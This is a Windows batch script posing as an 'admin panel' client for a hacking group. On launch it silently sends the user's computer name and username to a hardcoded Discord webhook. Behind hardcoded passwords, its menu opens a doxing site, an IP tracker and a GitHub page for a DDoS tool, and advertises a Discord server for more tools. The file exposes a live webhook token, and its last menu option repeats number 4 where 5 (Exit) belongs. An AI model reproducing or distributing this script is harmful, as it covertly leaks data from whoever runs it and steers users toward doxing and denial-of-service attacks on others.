@echo off
chcp 65001 >nul
color 0C
title Yexn Client - Secure Access

:: Set Webhook URL
set "webhook_url=https://discord.com/api/webhooks/1323214732756389899/ezXLQWRPQoq4fXeODM-Yt-w9zycw8DROfEL6xYY-9zyddHN0yV9OADh7mmi3v6Sc8iAK"

:: Notify via webhook using PowerShell
powershell -NoProfile -Command ^
    "Invoke-RestMethod -Uri '%webhook_url%' -Method Post -Body '{\"content\":\"**Yexn Client** opened on %COMPUTERNAME% by %USERNAME%.\"}' -ContentType 'application/json'"

:: Display a welcome message
cls
echo ============================================================
echo            WELCOME TO YEXN CLIENT - ADMIN PANEL
echo ============================================================
echo.
echo Please enter the password to continue...
echo ============================================================
echo.

:: Define valid passwords
set "password1=DOMIS"
set "password2=ABCD1234"
set "password3=XYz9@56"
set "password4=Test9876"
set "password5=SecurePass1"

:: Prompt for password
set /p pass="Enter Password:  "

:: Check if password matches any valid password
if "%pass%"=="%password1%" (
    echo Password accepted.
    timeout /t 2 >nul
    cls
    goto menu
) else if "%pass%"=="%password2%" (
    echo Password accepted.
    timeout /t 2 >nul
    cls
    goto menu
) else if "%pass%"=="%password3%" (
    echo Password accepted.
    timeout /t 2 >nul
    cls
    goto menu
) else if "%pass%"=="%password4%" (
    echo Password accepted.
    timeout /t 2 >nul
    cls
    goto menu
) else if "%pass%"=="%password5%" (
    echo Password accepted.
    timeout /t 2 >nul
    cls
    goto menu
) else (
    echo Incorrect password. Exiting...
    timeout /t 3 >nul
    exit
)

:menu
echo ============================================================
echo                    MAIN MENU
echo             https://discord.gg/K9fdT973
echo ============================================================
echo 1) Go Dox Website
echo 2) Go ip tracker web
echo 3) Download DDOS tool
echo 4) Join Our Discord f0r More Tools
echo 5) Exit
echo ============================================================
echo.

:: Prompt user to select an option
set /p input="Select an option [1-5]: "

:: Menu options to open links or exit
if "%input%" EQU "1" (
    start https://doxbin.org/
    cls
    goto menu
)

if "%input%" EQU "2" (
    start https://www.ip-tracker.org/
    cls
    goto menu
)

if "%input%" EQU "3" (
    start https://github.com/flocka700/Yexn-DDOS-TOOL
    cls
    goto menu
)

if "%input%" EQU "4" (
    start https://discord.gg/K9fdT973
    cls
    goto menu
)

if "%input%" EQU "4" (
    echo Exiting...
    timeout /t 2 >nul
    exit
)